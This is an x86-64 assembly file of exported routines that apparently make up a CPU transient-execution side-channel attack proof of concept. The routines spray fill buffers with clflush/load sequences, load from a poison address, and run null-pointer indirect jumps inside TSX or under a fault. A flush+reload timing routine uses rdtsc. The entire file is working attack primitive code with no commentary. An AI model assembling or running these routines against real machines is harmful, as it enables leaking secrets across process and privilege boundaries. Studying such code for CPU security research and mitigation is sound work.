 .text
 .code64
.global SprayFillBuffers 
.global PoisonFunction 
.global VictimFunctionTsx
.global VictimFunctionFault 
.global MeasureAccessTime
SprayFillBuffers:
    mfence
    clflush         0*64(%rcx)
    clflush         1*64(%rcx)
    clflush         2*64(%rcx)
    clflush         3*64(%rcx)
    clflush         4*64(%rcx)
    clflush         5*64(%rcx)
    clflush         6*64(%rcx)
    clflush         7*64(%rcx)
    clflush         8*64(%rcx)
    clflush         9*64(%rcx)
    clflush         10*64(%rcx)
    clflush         11*64(%rcx)
    clflush         12*64(%rcx)
    clflush         13*64(%rcx)
    clflush         14*64(%rcx)
    clflush         15*64(%rcx)
    mfence
    movq             0*64(%rcx),%rax
    movq             1*64(%rcx),%rax
    movq             2*64(%rcx),%rax
    movq             3*64(%rcx),%rax
    movq             4*64(%rcx),%rax
    movq             5*64(%rcx),%rax
    movq             6*64(%rcx),%rax
    movq             7*64(%rcx),%rax
    movq             8*64(%rcx),%rax
    movq             9*64(%rcx),%rax
    movq             10*64(%rcx),%rax
    movq             11*64(%rcx),%rax
    movq             12*64(%rcx),%rax
    movq             13*64(%rcx),%rax
    movq             14*64(%rcx),%rax
    movq             15*64(%rcx),%rax
    mfence
    ret
    mfence                                  
PoisonFunction:
    movq             $0xBDBD0000,%rcx       
    movq             (%rcx),%rax            
    mfence
    ret


VictimFunctionTsx:
    mfence
    xbegin      __abort_tsx
    movq       $0x0,%rax      
    jmp       *(%rax)            
    xend
__abort_tsx:
    mfence
    ret


VictimFunctionFault: 
    mfence
    movq        $0x0 ,%rax     
    jmp        *(%rax)             
    mfence
    ret

MeasureAccessTime:
    mfence

    rdtsc
    shl         $32,%rdx
    or          %rax,%rdx
    movq         %rdx,%r8

    lfence
    movb         (%rcx),%al 
    lfence

    rdtsc
    shl         $32,%rdx
    or          %rdx,%rax
    subq         %r8,%rax

    mfence
    clflush     (%rcx)
    mfence

    ret

